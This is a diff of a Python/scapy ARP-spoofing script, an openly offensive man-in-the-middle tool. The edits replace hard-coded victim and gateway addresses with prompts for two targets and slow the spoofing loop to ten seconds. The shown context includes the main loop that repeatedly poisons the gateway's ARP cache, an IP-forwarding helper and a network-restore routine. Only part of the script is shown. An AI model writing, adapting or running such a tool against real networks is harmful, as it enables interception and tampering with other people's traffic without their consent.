@@ -1,9 +1,5 @@
-#!/usr/bin/env python3
-
 from scapy.all import Ether, ARP, srp, send
-
 import argparse, time, os, sys
-
 
 def _enable_linux_iproute():
     """
@@ -71,9 +67,9 @@ def restore(target_ip, host_ip, verbose=True):
         
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.100.43"
+    target = str(input("Target 1: "))
     # gateway ip address
-    host = "192.168.100.27"
+    host = str(input("Target 2: "))
     # print progress to the screen
     verbose = True
     # enable ip forwarding
@@ -85,7 +81,7 @@ if __name__ == "__main__":
             # telling the `host` that we are the `target`
             spoof(host, target, verbose)
             # sleep for one second
-            time.sleep(1)
+            time.sleep(10)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
         restore(target, host)
